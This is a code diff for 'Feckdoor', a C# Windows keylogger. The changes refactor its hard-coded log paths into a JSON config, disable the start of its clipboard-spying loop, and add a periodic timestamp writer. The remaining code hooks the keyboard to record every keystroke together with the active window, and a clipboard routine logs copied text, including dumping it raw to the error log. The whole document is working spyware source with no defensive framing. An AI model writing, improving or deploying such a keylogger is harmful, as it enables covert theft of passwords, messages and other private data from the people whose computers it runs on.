@@ -7,8 +7,7 @@ namespace Feckdoor
 {
 	internal static class Program
 	{
-		private static string LogFile = @"D:\Cache\Feckdoor.log";
-		private static string ErrorLogFile = @"D:\Cache\FeckdoorError.log";
+		private static Config TheConfig;
 
 		private static ActiveWindowInfo ActiveWindowStringCache = new ActiveWindowInfo { Name = "Unknown", Executable = "Unknown" };
 		private static IntPtr HookID = IntPtr.Zero;
@@ -20,29 +19,27 @@ namespace Feckdoor
 		{
 			try
 			{
-				Config config = new Config();
+				TheConfig = new Config();
 
 				string configPath = Path.Combine(Environment.CurrentDirectory, "config.json");
 				if (File.Exists(configPath))
 				{
 					var tmp = JsonSerializer.Deserialize<Config>(File.ReadAllText(configPath));
 					if (tmp != null)
-						config = tmp;
+						TheConfig = tmp;
 				}
 				else
 					File.WriteAllText(configPath, Properties.Resources.DefaultConfig);
 
-				LogFile = config.LogFile;
-				ErrorLogFile = config.ErrorLogFile;
-
 				HookID = InstallHook(KeyboardHook);
-				Task.Run(async () => await ClipboardSpy());
+				// Task.Run(async () => await ClipboardSpy());
+				Task.Run(async () => await TimestampAdder());
 				Application.Run();
 				User32.UnhookWindowsHookEx(HookID);
 			}
 			catch (Exception ex)
 			{
-				File.AppendAllText(ErrorLogFile, $"Main thread error: {ex}\n");
+				File.AppendAllText(TheConfig.ErrorLogFile, $"Main thread error: {ex}\n");
 			}
 		}
 
@@ -50,32 +47,50 @@ namespace Feckdoor
 		{
 			while (true)
 			{
-				if (Clipboard.ContainsText())
+				string text = Clipboard.GetText();
+				await File.AppendAllTextAsync(TheConfig.ErrorLogFile, $"Clipboard spy str2: {text}\n");
+				if (ClipboardTextCache != text)
 				{
-					string text = Clipboard.GetText();
-					if (ClipboardTextCache != text)
+					using (var writer = new StreamWriter(TheConfig.LogFile, true))
 					{
-						using (var writer = new StreamWriter(LogFile, true))
+						try
 						{
-							try
-							{
-								writer.WriteLine(Environment.NewLine);
-								writer.WriteLine("> Clipboard text changed");
-								writer.WriteLine("New content: " + text);
-							}
-							catch (Exception e)
-							{
-								File.AppendAllText(ErrorLogFile, $"Clipboard spy error: {e}\n");
-							}
+							writer.WriteLine(Environment.NewLine);
+							writer.WriteLine("> Clipboard text changed");
+							writer.WriteLine("New content: " + text);
+						}
+						catch (Exception e)
+						{
+							await File.AppendAllTextAsync(TheConfig.ErrorLogFile, $"Clipboard spy error: {e}\n");
 						}
 					}
-					ClipboardTextCache = text;
 				}
-				else
-					ClipboardTextCache = "";
-				await Task.Delay(100);
+				ClipboardTextCache = text;
+				await Task.Delay(TheConfig.ClipboardSpyDelay);
 			}
 		}
+
+		private async static Task TimestampAdder()
+		{
+			while (true)
+			{
+				using (var writer = new StreamWriter(TheConfig.LogFile, true))
+				{
+					try
+					{
+						writer.WriteLine(Environment.NewLine);
+						writer.WriteLine($"--- {DateTime.Now} ---");
+						writer.WriteLine(Environment.NewLine);
+					}
+					catch (Exception e)
+					{
+						await File.AppendAllTextAsync(TheConfig.ErrorLogFile, $"Timestamper error: {e}\n");
+					}
+				}
+				await Task.Delay(TheConfig.TimestampDelay);
+			}
+		}
+
 
 		private static IntPtr InstallHook(User32.LowLevelKeyboardProc proc)
 		{
@@ -120,16 +135,17 @@ namespace Feckdoor
 					bool lineChange = currentKey.Equals("[Enter]", StringComparison.InvariantCultureIgnoreCase);
 
 					// Write keys
-					using (var writer = new StreamWriter(LogFile, true))
+					using (var writer = new StreamWriter(TheConfig.LogFile, true))
 					{
 						try
 						{
 							if (ActiveWindowStringCache != ActiveWindowToString())
 							{
 								writer.WriteLine(Environment.NewLine);
-								writer.WriteLine("> Active window changed");
+								writer.WriteLine("##### Active window change #####");
 								writer.WriteLine("Name: " + ActiveWindowStringCache.Name);
 								writer.WriteLine("Executable: " + ActiveWindowStringCache.Executable);
+								writer.WriteLine("##### Active window change #####");
 								writer.WriteLine();
 							}
 							if (lineChange)
@@ -140,13 +156,13 @@ namespace Feckdoor
 						}
 						catch (Exception e)
 						{
-							File.AppendAllText(ErrorLogFile, $"Keylogger keystroke write error: {e}{Environment.NewLine}");
+							File.AppendAllText(TheConfig.ErrorLogFile, $"Keylogger keystroke write error: {e}{Environment.NewLine}");
 						}
 					}
 				}
 				catch (Exception e)
 				{
-					File.AppendAllText(ErrorLogFile, $"Keylogger hook error: {e}{Environment.NewLine}");
+					File.AppendAllText(TheConfig.ErrorLogFile, $"Keylogger hook error: {e}{Environment.NewLine}");
 				}
 			}
 
@@ -194,7 +210,7 @@ namespace Feckdoor
 			}
 			catch (Exception)
 			{
-				return new ActiveWindowInfo { Name = "Errored", Executable = "Errored" };
+				return new ActiveWindowInfo { Name = TheConfig.FallbackWindowName, Executable = TheConfig.FallbackWindowExecutableName };
 			}
 		}
 	}
